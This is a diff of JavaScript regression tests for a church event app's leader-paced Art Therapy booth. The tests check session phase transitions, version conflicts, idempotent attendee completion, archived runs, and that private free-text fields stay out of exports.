+    sessionSummary(res.body, 1).participants.map((participant) => [
+      participant.name, participant.completedAt,
+    ]),
+    [["Orange Creator", null], ["Orange Painter", null]]
+  );
+  res = await request(port, "boothPresentation", { boothId: "art" });
+  assert.equal(res.status, 200);
+  assert.equal(res.body.status, "waiting");
+  assert.equal(res.body.stepIndex, 0);
+  assert.equal(res.body.version, 0);
+  assert.equal("participants" in res.body, false);
+
+  res = await request(port, "artState", { attendeeId: "art-orange-a" });
+  assert.equal(res.status, 200);
+  assert.equal(res.body.sessionNumber, 1);
+  assert.equal(res.body.assignedColor.id, "orange");
+  assert.equal(res.body.phase, "welcome");
+  assert.equal(res.body.version, 0);
+  assert.equal(res.body.runNumber, 1);
+  assert.equal(typeof res.body.runId, "string");
+  assert.equal(res.body.completedAt, null);
+  assert.equal("participants" in res.body, false);
+  const session1Run1Id = res.body.runId;
+
+  res = await request(port, "artState", { attendeeId: "art-blue-a" });
+  assert.equal(res.status, 403);
+  assert.equal(res.body.code, "ART_NOT_ASSIGNED");
+  res = await request(port, "artState", { attendeeId: "missing-art-attendee" });
+  assert.equal(res.status, 404);
+  assert.equal(res.body.code, "ATTENDEE_NOT_FOUND");
+  res = await request(port, "completeArt", { attendeeId: "art-orange-a" });
+  assert.equal(res.status, 409);
+  assert.equal(res.body.code, "ART_NOT_COMPLETE");
+  res = await request(port, "boothCheckin", {
+    attendeeId: "art-orange-a",
+    boothId: "art",
+    boothName: "Art Therapy Table",
+    checkedInBy: "self",
+  });
+  assert.equal(res.status, 409);
+  assert.equal(res.body.code, "ART_NOT_COMPLETE");
+
+  // The leader owns every reveal. Invalid ordering and stale versions cannot
+  // skip a slide or advance the room twice from two staff tabs.
+  res = await advance(4, "start", 0);
+  assert.equal(res.status, 400);
+  assert.equal(res.body.code, "INVALID_ART_SESSION");
+  res = await advance(1, "not_an_action", 0);
+  assert.equal(res.status, 400);
+  assert.equal(res.body.code, "INVALID_ART_ACTION");
+  res = await advance(1, "show_importance", 0);
+  assert.equal(res.status, 409);
+  assert.equal(res.body.code, "INVALID_ART_TRANSITION");
+  res = await advance(1, "start", 99);
+  assert.equal(res.status, 409);
+  assert.equal(res.body.code, "ART_SESSION_CONFLICT");
+
+  let session1Version = 0;
+  for (const [action, phase] of transitions) {
+    res = await advance(1, action, session1Version);
+    assert.equal(res.status, 200, action);
+    session1Version += 1;
+    assert.equal(res.body.state.phase, phase, action);
+    assert.equal(res.body.state.version, session1Version, action);
+    assert.equal(res.body.state.runId, session1Run1Id, action);
+    assert.equal(res.body.state.runNumber, 1, action);
+    if (action === "start") assertIsoTimestamp(res.body.state.startedAt, "Art Therapy run start");
+  }
+  assert.equal(session1Version, 9);
+  assertIsoTimestamp(res.body.state.completedAt, "Art Therapy run completion");
+  res = await request(port, "boothPresentation", { boothId: "art" });
+  assert.equal(res.status, 200);
+  assert.equal(res.body.status, "complete");
+  assert.equal(res.body.stepIndex, 7);
+  assert.equal(res.body.version, 9);
+  assert.match(res.body.message, /Attendees can finish/i);
+  res = await advance(1, "finish", 8);
+  assert.equal(res.status, 409);
+  assert.equal(res.body.code, "ART_SESSION_CONFLICT");
+
+  // Refreshing is server-authoritative: the latest leader phase and run are
+  // returned without a local, self-paced Art draft.
+  res = await request(port, "artState", { attendeeId: "art-orange-a" });
+  assert.equal(res.status, 200);
+  assert.equal(res.body.phase, "complete");
+  assert.equal(res.body.version, 9);
+  assert.equal(res.body.runId, session1Run1Id);
+  assert.equal(res.body.completedAt, null);
+
+  // Completion is immutable per attendee/run, idempotent on refresh, and
+  // ignores arbitrary free-text fields supplied by an untrusted client.
+  res = await request(port, "completeArt", {
+    attendeeId: "art-orange-a",
+    reflections: { private: "DO_NOT_EXPORT_ART_REFLECTION" },
+    note: "DO_NOT_EXPORT_ART_NOTE",
+    comment: "DO_NOT_EXPORT_ART_COMMENT",
+    rating: 5,
+  });
+  assert.equal(res.status, 200);
+  assert.equal(res.body.idempotent, false);
+  assert.equal(res.body.runId, session1Run1Id);
+  assert.equal(res.body.runNumber, 1);
+  assertIsoTimestamp(res.body.completedAt, "first Art Therapy attendee completion");
+  const firstArtCompletionAt = res.body.completedAt;
+  const firstArtCheckinId = res.body.checkinId;
+  res = await request(port, "completeArt", { attendeeId: "art-orange-a" });
+  assert.equal(res.status, 200);
+  assert.equal(res.body.idempotent, true);
+  assert.equal(res.body.checkinId, firstArtCheckinId);
+  assert.equal(res.body.completedAt, firstArtCompletionAt);
+  res = await request(port, "boothCheckin", {
+    attendeeId: "art-orange-a",
+    boothId: "art",
+    boothName: "Art Therapy Table",
+    checkedInBy: "self",
+    rating: 5,
+    note: "DO_NOT_EXPORT_GENERIC_ART_NOTE",
+    extraData: { reflections: "DO_NOT_EXPORT_GENERIC_ART_REFLECTION" },
+  });
+  assert.equal(res.status, 200);
+  assert.equal(res.body.idempotent, true);
+  assert.equal(res.body.checkinId, firstArtCheckinId);
+  res = await request(port, "completeArt", { attendeeId: "art-orange-b" });
+  assert.equal(res.status, 200);
+  assert.equal(res.body.idempotent, false);
+
+  res = await request(port, "artState", { attendeeId: "art-orange-a" });
+  assert.equal(res.body.completedAt, firstArtCompletionAt);
+  res = await request(port, "artDashboardData", { organizerKey });
+  let artSession1 = sessionSummary(res.body, 1);
+  assert.equal(artSession1.state.phase, "complete");
+  assert.equal(artSession1.participantCount, 2);
+  assert.equal(artSession1.completedCount, 2);
+  assert.equal(artSession1.participants.every((participant) => participant.completedAt), true);
+
+  let artDb = JSON.parse(fs.readFileSync(testDb, "utf8"));
+  const session1CompletionRows = artDb.artCompletions.filter((completion) => (
+    completion.sessionNumber === 1 && completion.runId === session1Run1Id
+  ));
+  assert.equal(session1CompletionRows.length, 2);
+  assert.deepEqual(
+    Object.keys(session1CompletionRows[0]).sort(),
+    ["attendeeId", "completedAt", "id", "runId", "runNumber", "sessionNumber"]
+  );
+  const completedArtCheckin = artDb.boothCheckins.find((checkin) => (
+    checkin.attendeeId === "art-orange-a" && checkin.boothId === "art"
+  ));
+  assert.ok(completedArtCheckin);
+  const privateArtPayload = JSON.stringify(completedArtCheckin);
+  [
+    "DO_NOT_EXPORT_ART_REFLECTION",
+    "DO_NOT_EXPORT_ART_NOTE",
+    "DO_NOT_EXPORT_ART_COMMENT",
+    "DO_NOT_EXPORT_GENERIC_ART_REFLECTION",
+    "DO_NOT_EXPORT_GENERIC_ART_NOTE",
+  ].forEach((privateField) => assert.equal(privateArtPayload.includes(privateField), false));
+  assert.equal(completedArtCheckin.rating, null);
+  assert.equal(completedArtCheckin.note, "");
+  ["reflections", "answers", "comment"].forEach((field) => {
+    assert.equal(Object.prototype.hasOwnProperty.call(completedArtCheckin.extraData || {}, field), false);
+  });
+  const artExport = buildExportSnapshot(artDb, {
+    generatedAt: "2026-07-18T22:30:00.000Z",
+  });
+  const exportedArtRows = artExport.tabs.BoothResults.rows.map((row) => (
+    Object.fromEntries(artExport.tabs.BoothResults.headers.map((header, index) => [header, row[index]]))
+  )).filter((row) => row.boothId === "art");
+  assert.equal(exportedArtRows.length, 2);
+  const exportedArtPayload = JSON.stringify(exportedArtRows);
+  assert.equal(exportedArtPayload.includes("DO_NOT_EXPORT_ART"), false);
+  assert.equal(exportedArtPayload.includes("reflections"), false);
+
+  // Invalid duplicate attendee/booth rows from an older identity merge are
+  // collapsed on read and stay collapsed after the next durable Art write.
+  const duplicateArtCheckin = {
+    ...completedArtCheckin,
+    id: "legacy-duplicate-art-checkin",
+    checkedInAt: "2026-07-18T20:19:59.000Z",
+    checkedInBy: "legacy-generic",
+    extraData: { reflections: "DO_NOT_KEEP_DUPLICATE_ART_DATA" },
+  };
+  artDb.boothCheckins.push(duplicateArtCheckin);
+  fs.writeFileSync(testDb, JSON.stringify(artDb, null, 2));
+  res = await request(port, "completeArt", { attendeeId: "art-orange-a" });
+  assert.equal(res.status, 200);
+  assert.equal(res.body.idempotent, true);
+  artDb = JSON.parse(fs.readFileSync(testDb, "utf8"));
+  const dedupedArtCheckins = artDb.boothCheckins.filter((checkin) => (
+    checkin.attendeeId === "art-orange-a" && checkin.boothId === "art"
+  ));
+  assert.equal(dedupedArtCheckins.length, 1);
+  assert.equal(JSON.stringify(dedupedArtCheckins).includes("DO_NOT_KEEP_DUPLICATE_ART_DATA"), false);
+
+  // Session 2 has its own clock assignment and state. Moving the clock does
+  // not alter Session 1's completed run or history.
+  res = await setSessionClock(2);
+  assert.equal(res.status, 200);
+  res = await request(port, "artState", { attendeeId: "art-green-a" });
+  assert.equal(res.status, 200);
+  assert.equal(res.body.sessionNumber, 2);
+  assert.equal(res.body.assignedColor.id, "green");
+  assert.equal(res.body.phase, "welcome");
+  res = await request(port, "artState", { attendeeId: "art-orange-a" });
+  assert.equal(res.status, 403);
+  assert.equal(res.body.code, "ART_NOT_ASSIGNED");
+  res = await advance(2, "start", 0);
+  assert.equal(res.status, 200);
+  assert.equal(res.body.state.phase, "definition");
+  res = await request(port, "artDashboardData", { organizerKey });
+  assert.equal(sessionSummary(res.body, 1).state.phase, "complete");
+  assert.equal(sessionSummary(res.body, 1).completedCount, 2);
+  assert.equal(sessionSummary(res.body, 2).state.phase, "definition");
+  assert.equal(sessionSummary(res.body, 2).completedCount, 0);
+  assert.equal(sessionSummary(res.body, 3).state.phase, "welcome");
+
+  // Restart preserves a read-only snapshot of the completed run. The active
+  // run gets a new identity, while stale reset versions cannot replace it.
+  res = await request(port, "resetArtSession", {
+    sessionNumber: 1,
+    version: 8,
+    organizerKey,
+  });
+  assert.equal(res.status, 409);
+  assert.equal(res.body.code, "ART_SESSION_CONFLICT");
+  res = await request(port, "resetArtSession", {
+    sessionNumber: 1,
+    version: 9,
+    organizerKey,
+  });
+  assert.equal(res.status, 200);
+  assert.equal(res.body.state.phase, "welcome");
+  assert.equal(res.body.state.runNumber, 2);
+  assert.equal(res.body.state.version, 10);
+  assert.notEqual(res.body.state.runId, session1Run1Id);
+  assert.equal(res.body.participantCount, 0);
+  assert.equal(res.body.completedCount, 0);
+  assert.equal(res.body.participants.length, 2);
+  assert.equal(res.body.participants.every((participant) => participant.completedAt === null), true);
+  assert.equal(res.body.archivedRuns.length, 1);
+  assert.equal(res.body.archivedRuns[0].runId, session1Run1Id);
+  assert.equal(res.body.archivedRuns[0].runNumber, 1);
+  assert.equal(res.body.archivedRuns[0].phase, "complete");
+  assert.equal(res.body.archivedRuns[0].participantCount, 2);
+  assert.equal(res.body.archivedRuns[0].completedCount, 2);
+  assert.deepEqual(
+    res.body.archivedRuns[0].participants.map((participant) => participant.name),
+    ["Orange Creator", "Orange Painter"]
+  );
+  const session1Run2Id = res.body.state.runId;
+
+  // The same attendee can complete a later run. Its generic visit row may be
+  // repaired in place, but immutable Art completion records keep Run 1's
+  // archived participant snapshot intact.
+  res = await setSessionClock(1);
+  assert.equal(res.status, 200);
+  let session1Run2Version = 10;
+  for (const [action, phase] of transitions) {
+    res = await advance(1, action, session1Run2Version);
+    assert.equal(res.status, 200, `run 2 ${action}`);
+    session1Run2Version += 1;
+    assert.equal(res.body.state.phase, phase, `run 2 ${action}`);
+  }
+  assert.equal(session1Run2Version, 19);
+  res = await request(port, "completeArt", { attendeeId: "art-orange-a" });
+  assert.equal(res.status, 200);
+  assert.equal(res.body.idempotent, false);
+  assert.equal(res.body.runId, session1Run2Id);
+  assert.equal(res.body.checkinId, firstArtCheckinId);
+
+  res = await request(port, "artDashboardData", { organizerKey });
+  artSession1 = sessionSummary(res.body, 1);
+  assert.equal(artSession1.completedCount, 1);
+  assert.equal(artSession1.archivedRuns.length, 1);
+  assert.equal(artSession1.archivedRuns[0].runId, session1Run1Id);
+  assert.equal(artSession1.archivedRuns[0].completedCount, 2);
+  assert.deepEqual(
+    artSession1.archivedRuns[0].participants.map((participant) => participant.name),
+    ["Orange Creator", "Orange Painter"]
+  );
+  artDb = JSON.parse(fs.readFileSync(testDb, "utf8"));
+  assert.equal(artDb.artCompletions.filter((row) => row.attendeeId === "art-orange-a").length, 2);
+
+  // A later incomplete rehearsal is archived too. Histories stay newest-first
+  // and retain both earlier completion snapshots without leaking run state.
+  res = await request(port, "resetArtSession", {
+    sessionNumber: 1,
+    version: 19,
+    organizerKey,
+  });
+  assert.equal(res.status, 200);
+  assert.equal(res.body.state.runNumber, 3);
+  assert.equal(res.body.state.version, 20);
+  const session1Run3Id = res.body.state.runId;
+  res = await advance(1, "start", 20);
+  assert.equal(res.status, 200);
+  assert.equal(res.body.state.phase, "definition");
+  res = await request(port, "resetArtSession", {
+    sessionNumber: 1,
+    version: 21,
+    organizerKey,
+  });
+  assert.equal(res.status, 200);
+  assert.equal(res.body.state.runNumber, 4);
+  assert.equal(res.body.state.version, 22);
+  assert.deepEqual(
+    res.body.archivedRuns.map((run) => [run.runNumber, run.phase, run.completedCount]),
+    [[3, "definition", 0], [2, "complete", 1], [1, "complete", 2]]
+  );
+  assert.equal(res.body.archivedRuns[0].runId, session1Run3Id);
+  assert.equal(res.body.archivedRuns[1].runId, session1Run2Id);
+  assert.equal(res.body.archivedRuns[2].runId, session1Run1Id);
+
+  // The public APIs close again after 4:10, while protected staff history
+  // remains available until the overall organizer performs a destructive reset.
+  res = await request(port, "setDemoClock", {
+    mode: "ended",
+    targetIso: "2026-07-18T21:15:00.000Z",
+    organizerKey,
+  });
+  assert.equal(res.status, 200);
+  res = await request(port, "artState", { attendeeId: "art-orange-a" });
+  assert.equal(res.status, 409);
+  assert.equal(res.body.code, "ART_SESSION_CLOSED");
+  res = await request(port, "completeArt", { attendeeId: "art-orange-a" });
+  assert.equal(res.status, 409);
+  assert.equal(res.body.code, "ART_SESSION_CLOSED");
+  res = await request(port, "artDashboardData", { organizerKey });
+  assert.equal(sessionSummary(res.body, 1).archivedRuns.length, 3);
+  assert.equal(sessionSummary(res.body, 2).state.phase, "definition");
+
+  res = await request(port, "resetDemo", { organizerKey });
+  assert.equal(res.status, 200);
+  res = await request(port, "artDashboardData", { organizerKey });
+  assert.deepEqual(
+    res.body.sessions.map((session) => [
+      session.state.phase,
+      session.state.runNumber,
+      session.state.version,
+      session.completedCount,
+      session.archivedRuns.length,
+    ]),
+    [
+      ["welcome", 1, 0, 0, 0],
+      ["welcome", 1, 0, 0, 0],
+      ["welcome", 1, 0, 0, 0],
+    ]
+  );
+  const resetDb = JSON.parse(fs.readFileSync(testDb, "utf8"));
+  assert.deepEqual(resetDb.artSessions, {});
+  assert.deepEqual(resetDb.artCompletions, []);
+  assert.deepEqual(resetDb.artRunHistory, []);
+  assert.deepEqual(resetDb.boothCheckins, []);
+}
+
 async function runNewSongApiRegression(port) {
   const organizerKey = "test-organizer-key";
   const sessionSummary = (dashboard, sessionNumber) => (
@@ -2117,6 +2987,10 @@ async function runCapacityRegression(port) {
     yellow: ["story", "newsong", "trivia"],
   };
   const songChoices = ["He Called Me — Eugy Official", "Victory", "Elohim — Sondae"];
+  const artActions = [
+    "start", "show_importance", "show_purpose_image", "ask_heart", "show_proverbs",
+    "show_philippians", "start_art", "show_finished", "finish",
+  ];
 
   let res = await request(port, "resetDemo", { organizerKey });
   assert.equal(res.status, 200);
@@ -2155,15 +3029,18 @@ async function runCapacityRegression(port) {
   assert.equal(songVotes.every((result) => result.status === 200), true);
 
   const checkins = await Promise.all(assignments.flatMap((assignment) => (
-    routes[assignment.colorId].map((boothId, sessionIndex) => request(port, "boothCheckin", {
+    routes[assignment.colorId]
+      .map((boothId, sessionIndex) => ({ boothId, sessionIndex }))
+      .filter(({ boothId }) => boothId !== "art")
+      .map(({ boothId, sessionIndex }) => request(port, "boothCheckin", {
       attendeeId: assignment.attendeeId,
       boothId,
       boothName: boothId,
       checkedInBy: "capacity-test",
       extraData: { sessionNumber: sessionIndex + 1, wristbandColor: assignment.colorId },
-    }))
+      }))
   )));
-  assert.equal(checkins.length, 450);
+  assert.equal(checkins.length, 360);
   assert.equal(checkins.every((result) => result.status === 200), true);
 
   const phase3Finishes = await Promise.all(assignments.map((assignment) => (
@@ -2179,6 +3056,30 @@ async function runCapacityRegression(port) {
     request(port, "boothPresentation", { boothId: routes[assignment.colorId][0] }),
   ]));
   assert.equal(synchronizedReads.every((result) => result.status === 200), true);
+
+  // Art completion cannot use the generic check-in shortcut. Exercise the
+  // Orange Session 1 run through its full leader-controlled finale.
+  res = await request(port, "setDemoClock", {
+    mode: "session1",
+    targetIso: "2026-07-18T20:15:00.000Z",
+    organizerKey,
+  });
+  assert.equal(res.status, 200);
+  for (let version = 0; version < artActions.length; version += 1) {
+    res = await request(port, "advanceArtSession", {
+      sessionNumber: 1,
+      action: artActions[version],
+      version,
+      organizerKey,
+    });
+    assert.equal(res.status, 200, `Session 1 ${artActions[version]}`);
+  }
+  const session1ArtAttendees = assignments.filter((assignment) => assignment.colorId === "orange");
+  const session1ArtCompletions = await Promise.all(session1ArtAttendees.map((assignment) => request(
+    port, "completeArt", { attendeeId: assignment.attendeeId }
+  )));
+  assert.equal(session1ArtCompletions.length, 30);
+  assert.equal(session1ArtCompletions.every((result) => result.status === 200), true);
 
   res = await request(port, "setDemoClock", {
     mode: "session2",
@@ -2246,6 +3147,68 @@ async function runCapacityRegression(port) {
   assert.equal(res.body.sessions.find((session) => session.sessionNumber === 1).leaderboard.length, 0);
   assert.equal(res.body.sessions.find((session) => session.sessionNumber === 3).leaderboard.length, 0);
 
+  // The same rehearsal sends 30 Green wristbands through leader-paced Art
+  // Therapy in Session 2. Release all slides, then save one immutable run
+  // completion per phone through the server-authoritative finale.
+  for (let version = 0; version < artActions.length; version += 1) {
+    res = await request(port, "advanceArtSession", {
+      sessionNumber: 2,
+      action: artActions[version],
+      version,
+      organizerKey,
+    });
+    assert.equal(res.status, 200, artActions[version]);
+  }
+  const session2ArtAttendees = assignments.filter((assignment) => assignment.colorId === "green");
+  assert.equal(session2ArtAttendees.length, 30);
+  const artCompletions = await Promise.all(session2ArtAttendees.map((assignment) => request(
+    port,
+    "completeArt",
+    { attendeeId: assignment.attendeeId }
+  )));
+  assert.equal(artCompletions.every((result) => result.status === 200), true);
+  assert.equal(artCompletions.every((result) => result.body.idempotent === false), true);
+  res = await request(port, "artDashboardData", { organizerKey });
+  const capacityArtSession2 = res.body.sessions.find((session) => session.sessionNumber === 2);
+  assert.equal(capacityArtSession2.state.phase, "complete");
+  assert.equal(capacityArtSession2.completedCount, 30);
+  assert.equal(capacityArtSession2.participantCount, 30);
+  assert.equal(capacityArtSession2.participants.filter((participant) => participant.completedAt).length, 30);
+  assert.equal(res.body.sessions.find((session) => session.sessionNumber === 1).completedCount, 30);
+  assert.equal(res.body.sessions.find((session) => session.sessionNumber === 3).completedCount, 0);
+
+  // Red wristbands complete Art in Session 3, then return the shared clock to
+  // Session 2 so the dashboard assertions below retain their intended view.
+  res = await request(port, "setDemoClock", {
+    mode: "session3",
+    targetIso: "2026-07-18T20:55:00.000Z",
+    organizerKey,
+  });
+  assert.equal(res.status, 200);
+  for (let version = 0; version < artActions.length; version += 1) {
+    res = await request(port, "advanceArtSession", {
+      sessionNumber: 3,
+      action: artActions[version],
+      version,
+      organizerKey,
+    });
+    assert.equal(res.status, 200, `Session 3 ${artActions[version]}`);
+  }
+  const session3ArtAttendees = assignments.filter((assignment) => assignment.colorId === "red");
+  const session3ArtCompletions = await Promise.all(session3ArtAttendees.map((assignment) => request(
+    port, "completeArt", { attendeeId: assignment.attendeeId }
+  )));
+  assert.equal(session3ArtCompletions.length, 30);
+  assert.equal(session3ArtCompletions.every((result) => result.status === 200), true);
+  res = await request(port, "artDashboardData", { organizerKey });
+  assert.deepEqual(res.body.sessions.map((session) => session.completedCount), [30, 30, 30]);
+  res = await request(port, "setDemoClock", {
+    mode: "session2",
+    targetIso: "2026-07-18T20:35:00.000Z",
+    organizerKey,
+  });
+  assert.equal(res.status, 200);
+
   res = await request(port, "dashboardData", { organizerKey });
   assert.equal(res.status, 200);
   assert.equal(res.body.totals.registered, 150);
@@ -2287,6 +3250,7 @@ async function runCapacityRegression(port) {
 }
 
 async function runFrontendContractRegression() {
+  const webRoot = path.join(__dirname, "..", "..", "web");
   const phoneSource = fs.readFileSync(path.join(__dirname, "..", "..", "web", "shared", "phone.js"), "utf8");
   const phoneContext = {};
   vm.createContext(phoneContext);
@@ -2543,6 +3507,11 @@ async function runFrontendContractRegression() {
   assert.equal(typeof apiContext.__eventApi.heavenDashboardData, "function");
   assert.equal(typeof apiContext.__eventApi.advanceHeavenSession, "function");
   assert.equal(typeof apiContext.__eventApi.resetHeavenSession, "function");
+  assert.equal(typeof apiContext.__eventApi.artState, "function");
+  assert.equal(typeof apiContext.__eventApi.artDashboardData, "function");
+  assert.equal(typeof apiContext.__eventApi.advanceArtSession, "function");
+  assert.equal(typeof apiContext.__eventApi.resetArtSession, "function");
+  assert.equal(typeof apiContext.__eventApi.completeArt, "function");
   assert.equal(typeof apiContext.__eventApi.saveSongVote, "function");
   assert.equal(typeof apiContext.__eventApi.newSongState, "function");
   assert.equal(typeof apiContext.__eventApi.submitNewSongVote, "function");
@@ -2689,6 +3658,11 @@ async function runFrontendContractRegression() {
   const dashboardSource = fs.readFileSync(path.join(__dirname, "..", "..", "web", "organizer", "dashboard.html"), "utf8");
   const artKioskSource = fs.readFileSync(path.join(__dirname, "..", "..", "web", "phase2-booths", "kiosk-art.html"), "utf8");
   const songKioskSource = fs.readFileSync(path.join(__dirname, "..", "..", "web", "phase2-booths", "kiosk-newsong.html"), "utf8");
+  const artRoomSource = fs.readFileSync(path.join(__dirname, "..", "..", "web", "phase2-booths", "booth-art.html"), "utf8");
+  const artAttendeeSource = fs.readFileSync(path.join(__dirname, "..", "..", "web", "shared", "art-attendee.js"), "utf8");
+  const artStaffPageSource = fs.readFileSync(path.join(__dirname, "..", "..", "web", "phase2-staff", "art.html"), "utf8");
+  const artStaffSource = fs.readFileSync(path.join(__dirname, "..", "..", "web", "shared", "art-staff.js"), "utf8");
+  const storyRoomSource = fs.readFileSync(path.join(__dirname, "..", "..", "web", "phase2-booths", "booth-story.html"), "utf8");
   const phase1Source = fs.readFileSync(path.join(__dirname, "..", "..", "web", "phase1-entry", "index.html"), "utf8");
   const phase2Source = fs.readFileSync(path.join(__dirname, "..", "..", "web", "phase2-booths", "hub.html"), "utf8");
   const phase3Source = fs.readFileSync(path.join(__dirname, "..", "..", "web", "phase3-signup", "index.html"), "utf8");
@@ -2723,7 +3697,26 @@ async function runFrontendContractRegression() {
   assert.match(dashboardSource, /id="btn-apply-demo-time" aria-pressed="false"/);
   assert.match(dashboardSource, /latestDemoClockMode === "custom"/);
   assert.match(dashboardSource, /\.demo-timeline-actions \.btn\[aria-pressed="true"\]/);
+  assert.ok(
+    dashboardSource.indexOf("} else if (failed) {") < dashboardSource.indexOf("} else if (pending) {"),
+    "a failed Sheet export should take visual priority over its queued retry"
+  );
+  assert.match(dashboardSource, /\(pending && !failed\)/);
+  assert.match(dashboardSource, /failed \? "Retry now"/);
+  assert.match(dashboardSource, /document\.getElementById\("sheet-export-card"\)\.style\.display = "none"/);
   assert.doesNotMatch(dashboardSource, /id="signup-table"/);
+  listHtmlFiles(webRoot).forEach((filename) => {
+    const source = fs.readFileSync(filename, "utf8");
+    assert.doesNotMatch(
+      source,
+      /Local demo default|Production uses the key configured|All staff pages currently use the same event organizer key/i,
+      filename
+    );
+  });
+  [artRoomSource, storyRoomSource, artKioskSource].forEach((source) => {
+    assert.doesNotMatch(source, /id="booth-note"|id="booth-stars"|Rate this booth|Anything you'd like to share/i);
+  });
+  assert.doesNotMatch(artKioskSource, /\brating\s*:|\bstars\s*=/);
   assert.match(artKioskSource, /OrganizerAuth\.isCurrent\(authGeneration\)/);
   assert.match(songKioskSource, /let isSaving = false/);
   assert.match(songKioskSource, /if \(isSaving \|\| !currentVisitor\) return/);
@@ -2763,7 +3756,7 @@ async function runFrontendContractRegression() {
   assert.match(phase2Source, /phase3\.href = EventSchedule\.linkWithPreview\("\.\.\/phase3-signup\/index\.html"\)/);
   assert.match(phase2Source, /\["phase2-name", "phase2-raffle"\]/);
   assert.match(phase2Source, /firstBoothPhoneInput\.addEventListener\("keydown"/);
-  assert.match(phase2Source, /const completionLivesInActivity = \["trivia", "heaven", "newsong"\]\.includes\(currentBooth\.id\)/);
+  assert.match(phase2Source, /const completionLivesInActivity = \["trivia", "heaven", "art", "newsong"\]\.includes\(currentBooth\.id\)/);
   assert.match(phase2Source, /Finish \$\{currentBooth\.title\} from its final screen/);
   assert.doesNotMatch(phase2Source, /window\.location\.href = "\.\.\/phase3-signup\/index\.html"/);
   assert.match(boothRoomSource, /const portal = `phase2\.\$\{boothId\}`/);
@@ -2890,6 +3883,87 @@ async function runFrontendContractRegression() {
   assert.match(heavenStaffSource, /confirmationCounts: normalizeCounts\(source\.confirmationCounts\)/);
   assert.match(heavenStaffSource, /source\.archivedRuns/);
   assert.match(heavenStaffSource, /session\.archivedRuns\.map/);
+
+  // Art Therapy is a dedicated leader-paced presentation. The attendee page
+  // has no self-paced slide navigation or reflection form; it renders only
+  // the current backend phase and releases completion after the leader ends.
+  assert.match(artRoomSource, /shared\/art-attendee\.js/);
+  assert.match(artRoomSource, /ArtAttendee\.init\(/);
+  assert.match(artRoomSource, /onCompleted: \(\) => window\.completeBoothRoom\(BOOTH_NAME\)/);
+  assert.doesNotMatch(
+    artRoomSource,
+    /ART_BEATS|ART_DRAFT_SCOPE|JourneyState\.|btn-art-(?:next|prev)|art-reflection-input|renderBoothFooter\(|finishBooth\(/
+  );
+  assert.doesNotMatch(artRoomSource, /maximum-scale\s*=\s*1|user-scalable\s*=\s*no/i);
+  assert.doesNotMatch(artAttendeeSource, /JourneyState\.|confirmArtStep|<textarea|contenteditable|rating|comment/i);
+  assert.match(artAttendeeSource, /new Set\(\[\s*"welcome",\s*"definition",\s*"importance",\s*"purpose_image",\s*"heart_question",\s*"proverbs",\s*"philippians",\s*"create",\s*"finished",\s*"complete",?\s*\]\)/);
+  assert.match(artAttendeeSource, /EventAPI\.artState\(identity\.attendeeId\)/);
+  assert.match(artAttendeeSource, /EventAPI\.completeArt\(identity\.attendeeId\)/);
+  assert.match(artAttendeeSource, /What is art therapy\?/i);
+  assert.match(artAttendeeSource, /Why is art therapy important\?/i);
+  assert.match(artAttendeeSource, /Do you know what the Bible says about the heart\?/i);
+  assert.match(artAttendeeSource, /Above all else, guard your heart, for everything you do flows from it\./);
+  assert.match(artAttendeeSource, /Proverbs 4:23/);
+  assert.match(artAttendeeSource, /the peace of God, which transcends all understanding, will guard your hearts and your minds in Christ Jesus\./i);
+  assert.match(artAttendeeSource, /Philippians 4:7/);
+  assert.match(artAttendeeSource, /Now it(?:’|')s your turn! Let(?:’|')s use art therapy/i);
+  assert.match(artAttendeeSource, /I(?:’|')m finished(?:—|,| -)\s*now what\?/i);
+  assert.match(artAttendeeSource, /art-therapy-heart-and-mind\.jpeg/);
+  assert.match(artAttendeeSource, /state\.sessionNumber === next\.sessionNumber/);
+  assert.match(artAttendeeSource, /next\.runNumber < state\.runNumber/);
+  assert.match(artAttendeeSource, /next\.version < state\.version/);
+  assert.match(artAttendeeSource, /runId: state\.runId/);
+  assert.match(artAttendeeSource, /runNumber: state\.runNumber/);
+  assert.match(artAttendeeSource, /phase: state\.phase/);
+  assert.match(artAttendeeSource, /id="btn-art-done"/);
+  assert.match(
+    artAttendeeSource,
+    /EventAPI\.completeArt\(identity\.attendeeId\)[\s\S]*onCompleted\(\)/,
+    "Art completion must persist before the local room is marked complete"
+  );
+  assert.match(
+    artAttendeeSource,
+    /EventAPI\.completeArt\(identity\.attendeeId\)[\s\S]*completionBusy = false;[\s\S]*renderState\(\);[\s\S]*onCompleted\(\)/,
+    "Same-page reopen must restore an enabled completion card"
+  );
+  assert.equal(
+    fs.existsSync(path.join(
+      __dirname, "..", "..", "web", "assets", "art-therapy-heart-and-mind.jpeg"
+    )),
+    true
+  );
+
+  // The Art booth leader owns three isolated versioned runs, precise reveal
+  // actions, current completion progress, and read-only archived rotations.
+  assert.match(artStaffPageSource, /shared\/art-staff\.js/);
+  assert.match(artStaffPageSource, /id="art-session-tabs"/);
+  assert.match(artStaffPageSource, /data-art-session="1"/);
+  assert.match(artStaffPageSource, /data-art-session="2"/);
+  assert.match(artStaffPageSource, /data-art-session="3"/);
+  assert.match(artStaffPageSource, /id="art-stage"/);
+  assert.match(artStaffPageSource, /id="art-actions"/);
+  assert.match(artStaffPageSource, /id="art-progress-table"/);
+  assert.match(artStaffPageSource, /id="art-run-history"/);
+  assert.match(artStaffPageSource, /id="btn-art-restart"/);
+  assert.match(artStaffPageSource, /id="btn-art-refresh"/);
+  assert.doesNotMatch(artStaffPageSource, /booth-staff-common\.js|initBoothStaff\("art"\)/);
+  assert.match(artStaffSource, /EventAPI\.artDashboardData\(OrganizerAuth\.key\(\)\)/);
+  assert.match(artStaffSource, /EventAPI\.advanceArtSession\([\s\S]*session\.sessionNumber,[\s\S]*action,[\s\S]*session\.state\.version,[\s\S]*OrganizerAuth\.key\(\)[\s\S]*\)/);
+  assert.match(artStaffSource, /EventAPI\.resetArtSession\([\s\S]*session\.sessionNumber,[\s\S]*session\.state\.version,[\s\S]*OrganizerAuth\.key\(\)[\s\S]*\)/);
+  assert.match(artStaffSource, /data-art-action=/);
+  [
+    "start", "show_importance", "show_purpose_image", "ask_heart", "show_proverbs",
+    "show_philippians", "start_art", "show_finished", "finish",
+  ].forEach((action) => assert.match(artStaffSource, new RegExp(`"${action}"`)));
+  assert.match(artStaffSource, /source\.archivedRuns/);
+  assert.match(artStaffSource, /session\.archivedRuns\.map/);
+  assert.match(artStaffSource, /completedCount/);
+  assert.match(artStaffSource, /not saved Done for this run/);
+  assert.match(artStaffSource, /options\.queue/);
+  assert.match(artStaffSource, /refreshQueued/);
